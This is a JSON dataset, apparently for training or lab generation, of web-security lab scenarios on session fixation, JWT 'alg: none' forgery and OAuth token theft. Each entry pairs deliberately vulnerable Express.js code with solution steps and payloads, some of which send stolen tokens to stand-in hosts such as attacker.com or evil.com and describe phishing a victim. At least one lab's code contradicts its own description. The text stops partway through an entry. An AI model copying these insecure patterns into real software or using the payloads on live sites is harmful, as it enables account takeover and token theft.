[
  {
  "Lab scenario": "Session fixation via cookie injection",
  "Lab Description": "This lab demonstrates session fixation in the authentication process. The application assigns session IDs before authentication and fails to invalidate them post-login. The application reuses existing session cookies instead of issuing new ones after login. To solve: Fixate a valid session ID before login and hijack Carlos's authenticated session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite Proxy to capture a pre-login request to /login and observe the Set-Cookie header containing the session ID.",
    "Send the pre-login request to Burp Repeater and extract the session cookie.",
    "Log in to your own account using the session cookie to verify the session fixation behavior.",
    "Send a crafted phishing link to Carlos with the fixed session ID in a Set-Cookie header using OWASP ZAP or a controlled web page.",
    "Once Carlos logs in with the attacker-defined session, reuse the fixed session ID to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'secret123' }; app.get('/login', (req, res) => { if (!req.cookies.sessionID) { const sid = Math.random().toString(36).substring(7); res.cookie('sessionID', sid); sessions[sid] = null; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionID] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionID]; if (user) { res.send(`Welcome back, ${user}`); } else { res.send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "Set-Cookie: sessionID=attackerSession",
    "GET /login HTTP/1.1 with injected sessionID",
    "Login link: http://victimsite/login with pre-set cookie sessionID=attackerSession",
    "GET /my-account with sessionID=attackerSession"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion with none header",
  "Lab Description": "This lab's JWT validation mechanism trusts the 'alg' header from incoming tokens. The application accepts unsigned tokens if the alg is set to 'none'. To solve: Forge a JWT token with alg: none and impersonate the user Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to capture a valid login and observe the JWT in the Authorization header.",
    "Decode the JWT using jwt.io and identify the algorithm used in the header, typically 'HS256'.",
    "Modify the JWT to set alg: none and change the payload to {\"username\":\"carlos\"}.",
    "Remove the signature part and reconstruct the token with only header and payload.",
    "Use the forged token in the Authorization header and request /my-account to confirm impersonation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = { carlos: 'secret123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${payload.username}`); } catch (err) { res.status(403).send('Access denied'); } }); app.listen(4001);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer [unsigned JWT]",
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}"
  ]
},
{
  "Lab scenario": "OAuth token leakage via referer header",
  "Lab Description": "The application exposes access tokens via the Referer header due to improper redirection. Tokens are embedded in URLs and leak during third-party image or script loads. To solve: Capture Carlos's access token from the Referer header and use it to access his account via the OAuth /userinfo endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Login and inspect a successful OAuth redirect to see the access_token in the URL fragment.",
    "Embed a third-party image (e.g., <img src=\"http://attacker.com/log\">) in your profile bio field and save.",
    "Wait for Carlos to visit your profile, leaking his Referer to your server which includes the token.",
    "Retrieve the access token from server logs and replay it via Postman to the /userinfo endpoint.",
    "Use the returned JSON data to confirm Carlos’s identity and mark the lab as solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; const profiles = {}; app.post('/update-profile', (req, res) => { const { username, bio } = req.body; profiles[username] = { bio }; res.send('Profile updated'); }); app.get('/profile/:user', (req, res) => { const user = req.params.user; if (profiles[user]) { res.send(`<div>${profiles[user].bio}</div>`); } else { res.send('No profile'); } }); app.get('/userinfo', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) { res.json({ user }); } else { res.status(403).json({ error: 'Invalid token' }); } }); app.listen(4002);",
  "payloads": [
    "<img src=\"http://attacker.com/log\">",
    "OAuth redirect URL with access_token in fragment",
    "GET /userinfo?access_token=abc123token",
    "Referer: http://victim.com/callback#access_token=abc123token"
  ]
},
{
  "Lab scenario": "Session Fixation via Pre-Auth Token in Login Flow",
  "Lab Description": "This application fails to invalidate session tokens on login. An attacker can fix a session ID prior to authentication and hijack the victim’s session post-login. The application sets a session ID before verifying credentials but does not regenerate it. To solve: hijack Carlos’s session after login using a pre-fixed session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept GET /login using Burp Suite and capture the Set-Cookie header with the session token.",
    "Use Burp Repeater to manually log in as Carlos using valid credentials, but send the captured session cookie in the request header.",
    "Verify that the session ID is not changed after successful login.",
    "Craft a phishing scenario or use social engineering to trick Carlos into logging in using the attacker’s fixed session cookie.",
    "After login, use the fixed session ID to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixationSecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Account details for carlos'); else res.send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "GET /login -> capture session ID",
    "POST /login with fixed session cookie",
    "GET /my-account with session ID set to fixed value"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in Authorization Header",
  "Lab Description": "This lab uses JWTs for access control but improperly validates the signature algorithm. The server does not enforce signed JWTs when the 'alg' header is set to 'none'. To solve: forge a token impersonating Carlos and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the Authorization header after login as your own account.",
    "Decode the JWT using jwt.io or Burp Decoder and analyze the payload.",
    "Replace the 'alg' field in the JWT header with 'none' and remove the signature section entirely.",
    "Change the username in the payload to 'carlos' and re-encode the JWT (Base64Url).",
    "Send the modified token in the Authorization header and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; const users = [{ username: 'carlos' }, { username: 'wiener' }]; app.get('/login', (req, res) => { const user = users.find(u => u.username === req.query.user); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: user.username }, secret); res.send({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); const payload = jwt.decode(token); if (payload.user === 'carlos') return res.send('Account details for carlos'); res.send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"user\":\"carlos\"}",
    "Authorization: Bearer <header>.<payload>.",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "OAuth2 Redirect URI Manipulation in Authorization Code Flow",
  "Lab Description": "The application integrates with an OAuth provider but fails to properly validate redirect URIs during the authorization code exchange. An attacker can manipulate this to steal authorization codes. To solve: steal Carlos’s OAuth token and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP or Burp to analyze the OAuth flow from login initiation to redirect with code.",
    "Register a malicious domain (or use a request bin) and set it as the redirect_uri parameter.",
    "Send the manipulated OAuth login URL to Carlos via phishing or other delivery.",
    "Capture the redirected authorization code from Carlos’s session.",
    "Exchange the stolen code for an access token and use it to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth/callback', async (req, res) => { const code = req.query.code; const tokenResp = await axios.post('https://oauth.example.com/token', { code }); const token = tokenResp.data.access_token; const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); if (userInfo.data.username === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "https://oauth.example.com/auth?client_id=app123&redirect_uri=https://attacker.com/callback&response_type=code",
    "Capture redirected code from attacker.com",
    "POST to token endpoint with stolen code",
    "GET /my-account with Authorization: Bearer <token>"
  ]
},
{
  "Lab scenario": "GraphQL session fixation via login mutation",
  "Lab Description": "The application's GraphQL login mutation allows session fixation due to improper session regeneration. Upon successful authentication, the application does not invalidate the existing session ID, enabling attackers to predetermine a victim’s session. To solve: Hijack Carlos's session by setting a known session cookie prior to login and reuse it to access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, intercept your own GraphQL login mutation and observe that the session cookie is preserved post-login.",
    "2.In Burp Repeater, craft a login mutation using Carlos’s credentials and send it with a manually chosen session ID in the cookie header (e.g., session=attacker123).",
    "3.Confirm the response logs in Carlos and the session remains attacker123.",
    "4.Use the attacker123 cookie in a new request to /my-account and confirm it now grants access to Carlos’s account.",
    "5.Access /my-account with session=attacker123 to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'graphqlpass' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; if (query.includes('mutation Login')) { const { username, password } = variables; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.json({ data: { login: true } }); } } res.status(401).json({ error: 'Login failed' }); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "{\"query\":\"mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }\",\"variables\":{\"username\":\"carlos\",\"password\":\"graphqlpass\"}}",
    "Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion with none in REST API",
  "Lab Description": "The REST API accepts JWTs but fails to enforce strong algorithm validation. An attacker can forge a token by setting the algorithm to 'none' and bypass signature verification. To solve: Log in as the admin user by crafting a JWT with alg=none and access the protected admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Postman to capture the valid JWT issued after login with your account.",
    "2.Decode the token using jwt.io or Burp decoder and note the 'alg' field in the header.",
    "3.Replace 'alg' with 'none', set 'sub' to 'admin', and remove the signature part.",
    "4.Re-encode the header and payload using base64url and reconstruct the token without a signature.",
    "5.Send the forged token to /admin with Authorization: Bearer <forged-token> and verify access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: user.username }, 'supersecret'); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { return res.send('Admin access granted'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.sub === 'admin') return res.send('Admin access granted'); } catch (e) {} res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"sub\":\"admin\"}",
    "Final Token: base64url(header) + '.' + base64url(payload) + '.'"
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via referrer",
  "Lab Description": "The application uses OAuth implicit flow with access tokens returned in the URL fragment. Due to a misconfiguration, the redirect URI includes external domains, and the token leaks via the HTTP Referer header. To solve: Intercept Carlos’s token by injecting a malicious redirect_uri and reuse the token to access /user-info as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use OWASP ZAP to proxy the OAuth flow and initiate login using the victim's account.",
    "2.Modify the redirect_uri parameter to point to your attacker-controlled domain and capture the access_token from the URL fragment.",
    "3.Extract the access_token from the Referer header in requests made to your server.",
    "4.Use Postman to send GET /user-info with Authorization: Bearer <stolen-token>.",
    "5.Confirm that the token grants access to Carlos's user data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'token-carlos-123' }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (response_type === 'token') { const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); } else { res.status(400).send('Invalid request'); } }); app.get('/user-info', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'token-carlos-123') return res.send('User info: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "https://auth.example.com/oauth/authorize?response_type=token&client_id=client123&redirect_uri=https://evil.com/steal&state=xyz",
    "Authorization: Bearer token-carlos-123"
  ]
},
{
  "Lab scenario": "Session Fixation in login endpoint with pre-set cookies",
  "Lab Description": "This lab is vulnerable to session fixation. The application assigns session tokens before authentication and accepts them post-login without regeneration. An attacker can trick a victim into using a known session ID, then log in with that session and hijack their account. To solve: Hijack Carlos's session and access his My Account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite Proxy to capture the initial GET /login request and note that a session cookie is issued prior to authentication.",
    "2. Replay the request with a manually set session cookie (e.g., 'session=attackersession') and confirm it's accepted.",
    "3. Send a crafted link to the victim containing the pre-set session cookie (simulate victim opening it in browser).",
    "4. Log in using Carlos’s credentials while reusing the fixed session ID (attackersession).",
    "5. Once the victim logs in with that session ID, access /my-account using the same session to verify hijacked access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 's3cr3t' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = req.cookies.session || Math.random().toString(36).slice(2); res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Account: ${user}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
  "payloads": [
    "GET /login HTTP/1.1\\nCookie: session=attackersession",
    "POST /login HTTP/1.1\\nCookie: session=attackersession\\nusername=carlos&password=s3cr3t",
    "GET /my-account HTTP/1.1\\nCookie: session=attackersession"
  ]
},
{
  "Lab scenario": "JWT Tampering in Authorization Header using None algorithm",
  "Lab Description": "The application uses JWTs for session management but fails to enforce the use of strong algorithms. The server accepts tokens signed with 'none', effectively disabling signature verification. To solve: Modify a JWT to impersonate Carlos and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Capture a JWT from your own authenticated request using Postman or Burp.",
    "2. Decode the JWT using jwt.io or another decoder and modify the payload to {\"user\":\"carlos\"}.",
    "3. Change the 'alg' field in the header from 'HS256' to 'none'.",
    "4. Remove the signature portion and recombine header.payload.",
    "5. Replay the modified token in the Authorization: Bearer header and access /admin."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload && decoded.payload.user === 'carlos') { res.send('Welcome admin carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4001);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"user\":\"carlos\"}",
    "JWT: base64url(header).base64url(payload).(no signature)",
    "Authorization: Bearer [crafted JWT]"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in callback endpoint",
  "Lab Description": "The application integrates OAuth but doesn't properly validate the redirect_uri. This allows an attacker to redirect tokens to an attacker-controlled domain. To solve: Leak Carlos’s OAuth token using a crafted authorization URL, then use it to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp to intercept the /auth/login OAuth redirection and examine the redirect_uri parameter.",
    "2. Create a malicious redirect_uri pointing to your server (e.g., https://attacker.com/catch?token=).",
    "3. Craft a link to: /auth/login?redirect_uri=https://attacker.com/catch.",
    "4. Simulate Carlos clicking the link and authorize the app — the token is leaked to your server.",
    "5. Use the stolen token as Bearer in Authorization header to access /profile endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const tokens = { 'carlos': 'abc123carlos-token' }; app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri; const user = 'carlos'; const token = tokens[user]; const redirectWithToken = `${redirectUri}?token=${token}`; res.redirect(redirectWithToken); }); app.get('/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; if (Object.values(tokens).includes(token)) { res.send('Carlos Profile Accessed'); } else { res.status(403).send('Invalid token'); } }); app.listen(4002);",
  "payloads": [
    "/auth/login?redirect_uri=https://attacker.com/catch",
    "GET https://attacker.com/catch?token=abc123carlos-token",
    "Authorization: Bearer abc123carlos-token"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in token verification endpoint",
  "Lab Description": "The application uses JWT for authentication but improperly trusts the 'alg' field in incoming tokens. It accepts 'none' algorithm tokens without verifying their signature. The application exposes a /verify endpoint that decodes the token without validating its authenticity. To solve: Forge a JWT with 'alg':'none' to impersonate Carlos and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a valid login request using Burp Suite and extract the JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Burp Decoder and analyze the payload structure.",
    "Modify the token header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\"}, remove the signature part entirely.",
    "Send the modified token using Postman or Repeater in the Authorization header to the /verify endpoint and ensure it returns user info for Carlos.",
    "Access the /my-account endpoint using the forged token to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.post('/verify', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload && decoded.payload.username) { res.send(`Welcome ${decoded.payload.username}`); } else { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Alg Confusion Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
  ]
},
{
  "Lab scenario": "Session fixation through predictable token parameter",
  "Lab Description": "The application supports login sessions via a GET token parameter that is reflected as a session ID cookie. This behavior is vulnerable to session fixation. The attacker can set a predefined token value and trick the victim into using it. To solve: Fix a session ID and get Carlos to log in using it, then access /my-account as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Visit /login?token=attacker-session and observe that the session cookie is set to 'attacker-session'.",
    "Send Carlos a crafted phishing link using the same token: /login?token=attacker-session.",
    "Once Carlos logs in via that URL, the session remains tied to the token 'attacker-session'.",
    "Reuse the fixed session token by sending it as a cookie: Cookie: session=attacker-session to /my-account.",
    "Confirm access to Carlos’s account and verify with account data returned from the endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token; if (token) { sessions[token] = 'carlos'; res.cookie('session', token); res.send('Login page loaded'); } else { res.send('Missing token'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Welcome back, carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "/login?token=attacker-session",
    "Cookie: session=attacker-session"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allowing token reuse",
  "Lab Description": "The application implements OAuth 2.0 login with a misconfigured redirect_uri and access_token reuse logic. An attacker can obtain a valid token meant for a benign user and replay it against privileged APIs without scope validation. To solve: Replay Carlos’s access token against the /account-info endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to capture the OAuth flow when logging in with your own account and record the redirect_uri and access_token.",
    "Alter the redirect_uri to a domain you control, observe that the authorization server accepts arbitrary URIs.",
    "Reconstruct the authorization code exchange manually to extract a token for Carlos by modifying the state parameter to impersonate him.",
    "Replay the access_token against /account-info by adding Authorization: Bearer <token>.",
    "Confirm account ownership by extracting Carlos’s data from the JSON response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const tokens = { 'abc123-token': 'carlos' }; app.get('/account-info', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) { res.json({ user: tokens[token], email: tokens[token] + '@example.com' }); } else { res.status(403).send('Invalid access token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Reuse Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Authorization: Bearer abc123-token",
    "GET /account-info HTTP/1.1"
  ]
},
{
  "Lab scenario": "Session Fixation via Predictable Session Token in Login Flow",
  "Lab Description": "The application uses predictable session tokens set before authentication. Upon successful login, the session identifier is not rotated, allowing session fixation. An attacker can force a victim to use a known session and hijack it after login. To solve: Fixate the session, get the victim to log in, and access their account using the same session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the initial GET /login request and note the session cookie value.",
    "Send the session cookie to the victim (assumed click on malicious link).",
    "Instruct the victim (simulate) to log in with valid credentials while using the attacker-fixed session.",
    "Use Burp Repeater with the same session ID and access /my-account.",
    "Confirm session hijack and successful access to the victim's authenticated page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/login', (req, res) => { const sid = 'session_' + Math.floor(Math.random() * 1000); res.cookie('session', sid); sessions[sid] = { authenticated: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (!sessions[sid]) return res.status(400).send('Session not found'); sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Welcome!'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].authenticated) return res.send(`Account page for ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "Force victim to use session_id=session_123",
    "Access /my-account with same session after victim login"
  ]
},
{
  "Lab scenario": "JWT Signature None Bypass in REST Login Flow",
  "Lab Description": "The application uses JWT for authentication but accepts tokens with the 'alg' field set to 'none'. This enables an attacker to forge tokens and gain unauthorized access. To solve: Craft a JWT with alg=none and impersonate Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to capture a valid JWT after logging in with a known user.",
    "Decode the JWT using jwt.io or Burp Decoder to inspect header/payload.",
    "Craft a new token with header {\"alg\":\"none\"} and payload {\"user\":\"carlos\"}.",
    "Remove the signature portion and send request with Authorization: Bearer <unsigned token>.",
    "Access /account endpoint as Carlos to confirm successful bypass."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ user: username }, 'secret'); res.json({ token }); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const payload = jwt.verify(token, 'secret'); res.send(`Hello ${payload.user}`); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}, Payload: {\"user\":\"carlos\"}",
    "Authorization: Bearer <base64(header).base64(payload)>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration with Open Redirect Token Theft",
  "Lab Description": "This application uses OAuth to delegate authentication. The 'redirect_uri' parameter is not properly validated, allowing attackers to redirect authorization codes to attacker-controlled endpoints. To solve: Steal Carlos's token via crafted redirect and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate OAuth flow and intercept redirect_uri in authorization request.",
    "Modify the redirect_uri to attacker.com/callback and forward the request.",
    "Simulate victim login to OAuth provider using Carlos's credentials (pre-known).",
    "Capture authorization code on attacker's server at /callback.",
    "Exchange stolen code for access_token via POST to /oauth/token.",
    "Use access_token in GET /profile endpoint to access Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const axios = require('axios'); const app = express(); const clients = [{ client_id: '123', client_secret: 'abc', redirect_uri: 'http://trusted.com/callback' }]; const users = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Unknown client'); const authCode = 'code1234'; const redirect = `${redirect_uri}?code=${authCode}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'code1234') return res.json({ access_token: 'token_carlos' }); res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token_carlos') return res.send('Carlos private profile'); res.status(401).send('Unauthorized'); }); app.listen(5000);",
  "payloads": [
    "GET /auth?client_id=123&redirect_uri=http://attacker.com/callback&state=xyz",
    "Intercepted code=code1234, exchange with POST /token",
    "Authorization: Bearer token_carlos"
  ]
},
{
  "Lab scenario": "Session fixation via login flow cookie persistence",
  "Lab Description": "The application improperly reuses session identifiers during the authentication process. Instead of generating a new session after a successful login, it maintains the same session ID issued pre-authentication. This flaw enables session fixation attacks where a malicious actor sets a session ID for the victim before they log in. To solve: Fixate Carlos’s session, log him in using the fixed session, then access his My Account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept initial GET /login using Burp Suite and capture the Set-Cookie header to obtain the session ID.",
    "Send this session ID to the victim via social engineering or iframe injection.",
    "Once the victim logs in using the fixed session ID, monitor the session on the attacker’s side using Burp.",
    "Replay the session using the fixed session ID in the Cookie header and access /account.",
    "Verify successful session fixation by accessing Carlos's data through /account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); let sessions = {}; let users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).slice(2); res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; let sid = req.cookies.sid; if (users[username] && users[username] === password) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.redirect('/account'); } res.status(403).send('Invalid credentials'); }); app.get('/account', (req, res) => { let sid = req.cookies.sid; if (sessions[sid] && sessions[sid].authenticated) { return res.send('Account page for ' + sessions[sid].user); } res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /login --> Extract sid cookie",
    "POST /login with sid=attacker_fixed_sid --> Login with known credentials",
    "GET /account with sid=attacker_fixed_sid --> Access victim account"
  ]
},
{
  "Lab scenario": "JWT tampering due to 'none' algorithm vulnerability",
